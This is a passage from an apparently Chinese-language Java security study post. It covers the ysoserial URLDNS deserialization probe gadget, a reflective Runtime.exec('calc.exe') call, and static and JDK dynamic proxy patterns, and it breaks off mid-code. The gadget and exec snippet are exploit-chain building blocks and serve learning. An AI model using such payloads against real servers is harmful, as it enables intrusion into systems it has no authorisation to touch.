class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                <span class="hljs-comment">//重置 URL 的缓存 hashCode</span><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>                PayloadRunner.run(URLDNS.class, args);<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URLStreamHandler</span> &#123;<br><br>                <span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title function_">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ysoserial 为了避免第一次序列化时就发起 DNS 请求，它使用了 SilentURLStreamHandler() 内部类自定义了 handler ，覆盖原来的 URL.hashCode.<font style="color:#080808;background-color:#ffffff;">handler，当第一次请求时，进入 SilentURLStreamHandler.getHostAddress  和  SilentURLStreamHandler.openConnection  ，都返回 null ，避免 DNS 请求和访问网络。这样在创建 payload 的阶段就不会触发 DNS ，而反序列化时，hashCode &#x3D;&#x3D; -1，触发原本的 getHostAddress 触发 DNS 请求。</font></p><h2 id="2-4-利用-Runtime"><a href="#2-4-利用-Runtime" class="headerlink" title="2.4 利用 Runtime"></a>2.4 利用 Runtime</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo01;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Runtime</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-comment">// 1. 获取 Runtime 类</span><br>        Class&lt;?&gt; runtimeClass = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><br>        <span class="hljs-comment">// 2. 获取 getRuntime() 方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><br>        <span class="hljs-comment">// 3. 调用 getRuntime() 获取 Runtime 对象</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> getRuntimeMethod.invoke(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// 4. 获取 exec(String) 方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br><br>        <span class="hljs-comment">// 5. 调用 exec() 执行 calc.exe</span><br>        execMethod.invoke(runtimeInstance, <span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757810.png"></p><h1 id="3、JDK-动态代理"><a href="#3、JDK-动态代理" class="headerlink" title="3、JDK 动态代理"></a>3、JDK 动态代理</h1><p>参考文章：</p><blockquote><p><a href="https://www.yuque.com/taohuayuanpang/kfw7zl/rpagg11nwkzm2qh2#nIfNv">代理模式(狂神)</a></p><p><font style="color:rgb(25, 27, 31);">设计模式（四）——搞懂什么是代理模式</font><a href="https://zhuanlan.zhihu.com/p/72644638">https://zhuanlan.zhihu.com/p/72644638</a></p></blockquote><p><strong>代理模式即 SpringAOP 的底层</strong></p><p><strong>代理模式分为静态代理和动态代理</strong></p><p>原型：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757644.png"> </p><h2 id="3-1-静态代理"><a href="#3-1-静态代理" class="headerlink" title="3.1 静态代理"></a>3.1 <strong>静态代理</strong></h2><p>角色分析：</p><ul><li>抽象角色 ： 一般会使用接口或者抽象类来解决</li><li>真实角色 ：被代理角色</li><li>代理角色 ：代理真实角色，</li><li>客户 ：访问代理对象的人</li></ul><p>代理模式的好处：</p><ul><li>可以使真实角色的操作更加纯粹，不用关注一些公共的业务</li><li>公共也交给代理角色，实现了业务的分工</li><li>公共业务发生扩展的时候，方便集中管理</li></ul><p>缺点：</p><ul><li>一个真实角色就会产生一个代理角色，代码量翻倍，开发效率会变低</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-comment">//租房</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Rent</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-comment">//房东</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Host</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;房东要出租房子&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//房东要租房子</span><br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Host</span>();<br>        <span class="hljs-comment">//代理，中介帮房东租房子，但是代理会有一些附属操作</span><br>        <span class="hljs-type">Proxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(host);<br>        <span class="hljs-comment">//你不用面对房东，直接找中介租房子</span><br>        proxy.rent();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span>&#123;<br><br>    <span class="hljs-keyword">private</span> Host  host;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">(Host host)</span> &#123;<br>        <span class="hljs-built_in">this</span>.host = host;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        host.rent();<br>        seeHouse();<br>        fare();<br>        hetong();<br>    &#125;<br><br>    <span class="hljs-comment">//看房</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">seeHouse</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;中介带你看房&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//收中介费</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fare</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;中介收取中介费&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//签租赁合同</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hetong</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;中介签租赁合同&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757637.png"></p><p>另一例:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-comment">//真实对象</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;增加了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;删除了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;修改了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;查询了一个用户&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-keyword">private</span> UserServiceImpl userService;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserService</span><span class="hljs-params">(UserServiceImpl userService)</span> &#123;<br>        <span class="hljs-built_in">this</span>.userService = userService;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;add&quot;</span>);<br>        userService.add();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;delete&quot;</span>);<br>        userService.delete();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;update&quot;</span>);<br>        userService.update();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;query&quot;</span>);<br>        userService.query();<br>    &#125;<br><br>    <span class="hljs-comment">//日志方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String msg)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;[Debug] 使用了&quot;</span>+msg+<span class="hljs-string">&quot;方法&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-comment">//代理类</span><br>        <span class="hljs-type">UserServiceProxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceProxy</span>();<br>        <span class="hljs-comment">//使用代理类实现日志功能！</span><br>        proxy.setUserService(userService);<br>        proxy.add();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(255, 0, 0);">在不改变原来的代码的情况下，实现了对原有功能的增强，这是AOP中最核心的思想</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757323.png"></p><h2 id="3-2-动态代理"><a href="#3-2-动态代理" class="headerlink" title="3.2 动态代理"></a>3.2 动态代理</h2><ul><li>动态代理和静态代理角色一样</li><li>动态代理的代理类是动态生成的，不是我们直接写好的</li><li>动态代理分为俩大类：基于接口的动态代理，基于类的动态代理<ul><li>基于接口–JDK 动态代理</li><li>基于类–cglib</li><li>java 字节码实现：javasist</li></ul></li></ul><p><font style="color:#080808;background-color:#ffffff;">了解俩个类：</font></p><ul><li>Proxy：代理</li><li><font style="color:#080808;background-color:#ffffff;">InvocationHandler：调用处理程序</font></li></ul><p><strong><font style="color:rgb(255, 0, 0) !important;background-color:rgb(248, 248, 248) !important;">动态代理的好处</font></strong></p><p><font style="color:rgba(0, 0, 0, 0.9);">静态代理有的它都有，静态代理没有的，它也有！</font></p><ul><li><font style="color:rgba(0, 0, 0, 0.9);">可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情 .</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">公共的业务由代理来完成 . 实现了业务的分工 ,</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">公共业务发生扩展时变得更加集中和方便 .</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">一个动态代理 , 一般代理某一类业务</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">一个动态代理可以代理多个类，代理的是接口！</font></li></ul><p>案例一</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-comment">//房东</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Host</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;房东要出租房子&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-comment">//租房</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Rent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-comment">//使用此类自动生成代理类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyInvocationHangler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>    <span class="hljs-comment">//被代理的接口</span><br>    <span class="hljs-keyword">private</span> Rent rent;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRent</span><span class="hljs-params">(Rent rent)</span> &#123;<br>        <span class="hljs-built_in">this</span>.rent = rent;<br>    &#125;<br><br>    <span class="hljs-comment">//生成得到代理类</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-built_in">this</span>.getClass().getClassLoader(),<br>                                      rent.getClass().getInterfaces(), <span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//处理代理实例，并返回结果</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-comment">//动态代理的本质，就是使用反射机制实现</span><br>        seeHouse();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> method.invoke(rent, args);<br>        <span class="hljs-comment">//return method.invoke(rent, args);</span><br>        fare();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">seeHouse</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;中介带看房子&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fare</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;收中介费&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//真实角色</span><br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Host</span>();<br>        <span class="hljs-comment">//代理角色，现在没有</span><br>        <span class="hljs-type">ProxyInvocationHangler</span> <span class="hljs-variable">pih</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyInvocationHangler</span>();<br>        <span class="hljs-comment">//通过调用程序处理角色来处理我们要调用的接口对象</span><br>        pih.setRent(host);<br>        <span class="hljs-type">Rent</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Rent) pih.getProxy();<br>        proxy.rent();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>案例二：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo04;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-comment">//使用此类自动生成代理类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyInvocationHangler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>    <span class="hljs-comment">//被代理的接口</span><br>    <span class="hljs-keyword">private</span> Object target;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTarget</span><span class="hljs-params">(Object target)</span> &#123;<br>        <span class="hljs-built_in">this</span>.target = target;<br>    